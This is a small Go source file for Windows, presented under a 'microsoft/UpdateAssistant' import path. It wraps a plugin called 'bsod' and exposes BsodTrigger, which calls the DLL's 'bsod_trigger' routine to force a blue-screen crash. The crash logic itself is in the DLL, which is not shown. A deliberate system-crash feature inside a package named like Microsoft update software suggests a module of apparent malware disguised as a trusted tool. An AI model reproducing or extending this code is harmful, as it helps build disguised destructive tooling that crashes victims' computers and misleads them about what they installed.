//go:build windows

package sysutil

import (
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
	bsodPlug *loader.Plugin
)

func bsodDLL(fn func(*loader.Plugin)) {
	if bsodPlug == nil {
		p, err := loader.Load("bsod")
		if err == nil {
			bsodPlug = p
		}
	}
	if bsodPlug != nil {
		fn(bsodPlug)
	}
}

func BsodUnload() {
	if bsodPlug != nil {
		loader.Unload(bsodPlug)
		bsodPlug = nil
	}
}

func BsodTrigger() bool {
	var result string
	bsodDLL(func(p *loader.Plugin) {
		buf := make([]byte, 256)
		n, _ := p.Call("bsod_trigger",
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
		)
		result = string(buf[:int(n)])
	})
	r := parseDLLResult(result)
	if !r.OK {
		logger.Error("bsod trigger failed: %s", r.Detail)
	}
	return r.OK
}
